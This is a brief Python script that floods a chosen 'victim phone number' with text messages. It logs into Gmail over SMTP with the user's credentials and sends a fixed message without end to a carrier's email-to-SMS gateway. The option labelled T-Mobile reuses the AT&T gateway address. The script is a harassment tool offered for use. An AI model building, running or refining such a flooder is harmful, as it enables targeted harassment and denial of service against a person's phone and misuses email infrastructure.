import smtplib
print("You will need to find out the mobile carrier for this to work. I reccomend this website: https://freecarrierlookup.com/"   

)
uname = input('enter email adress: ')
pword = input('enter password: ')
message = input("enter text: ")
num = input("victim phone number")
server = smtplib.SMTP( "smtp.gmail.com", 587 )
#sends texts through gmail server!!
server.starttls()
print("1) Verizon")
print("2) Sprint")
print("3) At and t")
print("4) T mobile")
#finding out email to send text to through SMTP server
carrier = input()
if carrier == ("1"):
   carrierm = ("@vtext.com")
elif carrier == ("2"):
   carrierm = ("@messaging.sprintpcs.com")
elif carrier == ("3"):
   carrierm = ("@txt.att.net")
elif carrier == ("4"):
  carrierm = ("@txt.att.net")
server.login( uname,pword )
while 1 == 1:
 server.sendmail( uname, num + carrierm, message )
 print("success")